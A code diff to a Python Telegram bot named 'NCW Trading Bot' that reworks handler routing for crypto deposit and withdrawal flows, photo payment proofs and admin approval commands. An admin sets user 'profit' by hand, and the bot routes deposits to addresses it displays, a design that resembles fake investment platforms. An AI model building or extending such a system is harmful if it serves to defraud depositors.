+        'selected_crypto', 'deposit_amount', 'withdraw_amount', 'bank_name', 'crypto_address', 'account_number', 'routing_number'
+    ]:
+        context.user_data.pop(key, None)
+    # Clear conversation state if set in application-level user_data
+    try:
+        app_user_data = context.application.dispatcher.user_data
+        if isinstance(app_user_data, dict) and user_id in app_user_data:
+            app_user_data[user_id].pop('conversation_state', None)
+            app_user_data[user_id].pop('_in_conversation', None)
+    except Exception:
+        # no-op if dispatcher user_data isn't accessible
+        pass
     
     if user_info['name'] and user_info['email'] and user_info['phone']:
         await context.bot.send_message(
@@ -1192,6 +1375,42 @@ async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         
     await update.message.reply_text(f"Your User ID is: {user_id}")
 
+
+async def top_level_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Fallback text handler for users not in ConversationHandler.
+    It routes incoming text messages (for example, deposit amount or withdraw flow) to the proper handlers
+    based on flags set in context.user_data (e.g., 'awaiting_deposit_amount').
+    """
+    # Prioritize deposit/withdraw flows for users who used the top-level menu
+    if context.user_data.get('awaiting_deposit_amount'):
+        await get_deposit_amount(update, context)
+        return
+    if context.user_data.get('awaiting_deposit_proof'):
+        # They shouldn't send text, but clear state and inform them
+        await update.message.reply_text("⚠️ Please send a photo as proof of payment.")
+        return
+    if context.user_data.get('awaiting_withdraw_amount'):
+        await get_withdraw_amount(update, context)
+        return
+    if context.user_data.get('awaiting_withdraw_crypto_address'):
+        await get_crypto_address(update, context)
+        return
+
+    # Not expecting any special text - ignore or notify user
+    logger.info("Received text outside conversation and no pending action for user %s", update.effective_user.id)
+    # optional: ask user to click a button or /start
+    await update.message.reply_text("Please use the main menu. Click 'START NOW' or type /start to begin.")
+
+
+async def top_level_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Fallback photo handler for users not in ConversationHandler. Used for deposit proofs."""
+    if context.user_data.get('awaiting_deposit_proof'):
+        await get_deposit_proof(update, context)
+        return
+
+    logger.info("Received photo outside conversation and no deposit proof expected for user %s", update.effective_user.id)
+    await update.message.reply_text("No action is expecting a photo right now. If you intended to send a payment proof, go to 'Deposit' from the main menu.")
+
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle errors"""
     logger.error(f"Update {update} caused error {context.error}")
@@ -1203,12 +1422,14 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
 def main() -> None:
     """Start the bot and send admin panel"""
+    keep_alive()
     application = Application.builder().token(BOT_TOKEN).build()
     
     from admin import (
         send_admin_panel, admin_panel, handle_admin_action,
         approve_deposit, approve_withdrawal, update_profit,
-        update_crypto_address, list_users, admin_help, send_login
+        update_crypto_address, list_users, admin_help, send_login,
+        approve_pending_user, cancel_admin_action
     )
     
     admin_id = get_admin_id()
@@ -1218,6 +1439,15 @@ def main() -> None:
     else:
         logger.warning("ADMIN_USER_ID not set, admin panel will not be sent.")
     
+    # Register admin callback handlers FIRST (these should work globally)
+    application.add_handler(CallbackQueryHandler(approve_pending_user, pattern='^approve_pending_user_'))
+    application.add_handler(CallbackQueryHandler(cancel_admin_action, pattern='^cancel_admin_action$'))
+    application.add_handler(CallbackQueryHandler(approve_new_user_button, pattern='^approve_new_user_'))
+    application.add_handler(CallbackQueryHandler(handle_admin_action, pattern='^admin_'))
+    application.add_handler(CallbackQueryHandler(handle_deposit_confirmation, pattern='^confirm_deposit_'))
+    application.add_handler(CallbackQueryHandler(approve_withdrawal_button, pattern='^approve_withdrawal_'))
+    
+    # CONVERSATION HANDLER - This should be registered AFTER admin handlers but BEFORE other handlers
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
@@ -1241,16 +1471,12 @@ def main() -> None:
                 CallbackQueryHandler(handle_deposit, pattern='^deposit$'),
                 CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'),
                 CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'),
-                CallbackQueryHandler(copy_address, pattern='^copy_address_'),
-                CallbackQueryHandler(payment_made, pattern='^payment_made$'),
-                CallbackQueryHandler(handle_deposit_confirmation, pattern='^confirm_deposit_'),
                 CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'),
-                CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto$'),
-                CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank$'),
+                    CallbackQueryHandler(show_withdraw_crypto_options, pattern='^withdraw_crypto$'),
+                    CallbackQueryHandler(handle_withdraw_crypto_select, pattern='^withdraw_select_'),
                 CallbackQueryHandler(show_trading_bot, pattern='^trading_bot$'),
                 CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'),
                 CallbackQueryHandler(handle_stake, pattern='^stake$'),
-                CallbackQueryHandler(approve_withdrawal_button, pattern='^approve_withdrawal_'),
                 CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             DEPOSIT_AMOUNT: [
@@ -1271,27 +1497,53 @@ def main() -> None:
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_crypto_address),
                 CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
-            WITHDRAW_BANK_NAME: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank_name),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
-            ],
-            WITHDRAW_ACCOUNT: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_account_number),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
-            ],
-            WITHDRAW_ROUTING: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_routing_number),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
-            ],
+            # Bank withdrawal states removed
         },
         fallbacks=[CommandHandler("start", start)],
         per_message=False
     )
     
+    # Add the conversation handler
     application.add_handler(conv_handler)
+    
+    # Add top-level handlers for main menu callbacks so they still work
+    # for users who don't have an active ConversationHandler state (e.g. newly approved users)
+    # These are added AFTER the conversation handler so they only run when conv handler doesn't
+    # handle the callback (i.e., user not currently in a conversation).
+    application.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_to_menu$'))
+    application.add_handler(CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'))
+    application.add_handler(CallbackQueryHandler(visit_website, pattern='^visit_website$'))
+    application.add_handler(CallbackQueryHandler(handle_deposit, pattern='^deposit$'))
+    application.add_handler(CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'))
+    application.add_handler(CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'))
+    application.add_handler(CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'))
+    application.add_handler(CallbackQueryHandler(show_withdraw_crypto_options, pattern='^withdraw_crypto$'))
+    application.add_handler(CallbackQueryHandler(handle_withdraw_crypto_select, pattern='^withdraw_select_'))
+    application.add_handler(CallbackQueryHandler(show_trading_bot, pattern='^trading_bot$'))
+    application.add_handler(CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'))
+    application.add_handler(CallbackQueryHandler(handle_stake, pattern='^stake$'))
+    application.add_handler(CallbackQueryHandler(cancel_operation, pattern='^cancel$'))
+    application.add_handler(CallbackQueryHandler(copy_address, pattern='^copy_address_'))
+    application.add_handler(CallbackQueryHandler(payment_made, pattern='^payment_made$'))
+    
+    # REMOVE THESE LINES - They're causing the problem by intercepting callbacks
+    # application.add_handler(CallbackQueryHandler(handle_deposit, pattern='^deposit$'))
+    # application.add_handler(CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'))
+    # application.add_handler(CallbackQueryHandler(show_trading_bot, pattern='^trading_bot$'))
+    # application.add_handler(CallbackQueryHandler(handle_stake, pattern='^stake$'))
+    # application.add_handler(CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'))
+    # application.add_handler(CallbackQueryHandler(visit_website, pattern='^visit_website$'))
+    # application.add_handler(CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'))
+    # application.add_handler(CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'))
+    # application.add_handler(CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto$'))
+    # application.add_handler(CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank$'))
+    # application.add_handler(CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'))
+    # application.add_handler(CallbackQueryHandler(copy_address, pattern='^copy_address_'))
+    # application.add_handler(CallbackQueryHandler(payment_made, pattern='^payment_made$'))
+    
+    # Command handlers (these can stay)
     application.add_handler(CommandHandler("getid", get_id))
     application.add_handler(CommandHandler("adminpanel", admin_panel))
-    application.add_handler(CallbackQueryHandler(handle_admin_action, pattern='^admin_'))
     application.add_handler(CommandHandler("approve", approve_deposit))
     application.add_handler(CommandHandler("approvewithdrawal", approve_withdrawal))
     application.add_handler(CommandHandler("updateprofit", update_profit))
@@ -1300,6 +1552,9 @@ def main() -> None:
     application.add_handler(CommandHandler("adminhelp", admin_help))
     application.add_handler(CommandHandler("sendlogin", send_login))
     application.add_error_handler(error_handler)
+    # Fallback text/photo handlers for users not inside a ConversationHandler
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, top_level_text_handler))
+    application.add_handler(MessageHandler(filters.PHOTO, top_level_photo_handler))
     
     logger.info("Starting NCW Trading Bot...")
     application.run_polling(allowed_updates=Update.ALL_TYPES, timeout=30)
